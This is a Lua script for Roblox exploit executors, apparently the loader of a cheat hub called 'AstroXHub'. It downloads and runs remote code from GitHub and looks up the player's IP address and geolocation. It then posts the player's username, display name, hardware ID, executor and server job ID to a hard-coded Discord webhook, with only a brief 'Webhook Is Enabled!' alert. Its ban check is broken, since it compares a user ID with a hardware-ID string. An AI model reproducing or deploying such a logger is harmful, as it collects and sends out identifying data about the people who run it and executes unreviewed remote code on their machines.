loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Remote.lua"))()
local Alert = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Alert"))()
Alert:create("Webhook Is Enabled!")
local bannedHWID = "2cb0a995-9048-4070-8475-cbdb6d0c149a"
local bannedHWID = "4341ed65-8298-4835-a6d3-6252230e565d"
local function checkAndKickPlayer()
    local player = game.Players.LocalPlayer
    local playerHWID = player.UserId
    if playerHWID == bannedHWID then
        game.players.LocalPlayer:Kick("You Have Been Banned From AstroXHub To Unban Come to Telegram")
    end
end    
checkAndKickPlayer()

local Players = game:GetService("Players")
local Name = game.Players.LocalPlayer.Name
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ExecutorUsing = identifyexecutor()
local HttpService = game:GetService("HttpService")
local Data =
{
    ["embeds"] = {
        {
            ["title"] = " 🧾 Detect Account",
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
            ["description"] = "**DisplayName**\n```"..game.Players.LocalPlayer.DisplayName.." ```\n**UserName**\n```"..Name.."```",
            ["color"] = tonumber("5800FF"),
            ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"},
            ["fields"] = {
                {
                    ["name"] = "💻 Executer:",
                    ["value"] = "```"..ExecutorUsing.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "💳 Hwid:",
                    ["value"] = hwid,
                    ["inline"] = true
                },
                
                {                
                    ["name"] = "⏳ Time:",
                    ["value"] = tostring(os.date("%X")),
                    ["inline"] = true
                },
        
                {                
                    ["name"] = "🤑 Job ID:",
                    ["value"] = " " .. ConsoleJobId,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "🥰 Ty For Use 🥰:",
                    ["value"] = "**__AstroXHub__**",
                    ["inline"] = true          
                }
            }              
        }
    }
}
local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)
local Request = http_request or request or HttpPost or syn.request
local Final = {Url = "https://discord.com/api/webhooks/1329954213811191913/gKQDWRFNoJjl2wIq6Ra8VazUAIx85EnKfTEXTwHa0e4gMuou3va-9hg0J53tFP_RnkrT", Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
